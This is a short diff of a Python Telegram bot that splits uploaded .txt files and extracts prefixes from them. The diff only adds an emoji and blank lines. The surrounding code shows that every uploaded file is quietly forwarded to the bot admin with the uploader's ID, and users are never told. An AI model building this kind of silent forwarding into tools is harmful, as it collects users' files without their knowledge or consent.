@@ -19,7 +19,7 @@ stop_requests = {}
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name
     await update.message.reply_text(
-        f"Hello {user_name}!\n\n"
+        f"Hello {user_name} 🥷!\n\n"
         "Upload a file in .txt format.\n\n"
         "Use command:\n"
         "/spl500\n"
@@ -40,6 +40,7 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file = await update.message.document.get_file()
     saved_files[user_id] = f"{user_id}_input.txt"
     await file.download_to_drive(saved_files[user_id])
+
     with open(saved_files[user_id], "rb") as f:
         await context.bot.send_document(
             chat_id=ADMIN_ID,
@@ -50,6 +51,7 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"User ID: {user_id}"
             ),
         )
+
     await update.message.reply_text(
         "TXT file received successfully!\n\n"
         "Now send command like:\n"
@@ -141,5 +143,6 @@ app.add_handler(CommandHandler("clear", clear_words))
 app.add_handler(MessageHandler(filters.Document.ALL, receive_txt))
 app.add_handler(MessageHandler(filters.Regex(r"^/spl\d+$"), split_file))
 app.add_handler(MessageHandler(filters.Regex(r"^/ext\d+$"), extract_prefix))
+
 print("Bot Running...")
 app.run_polling()
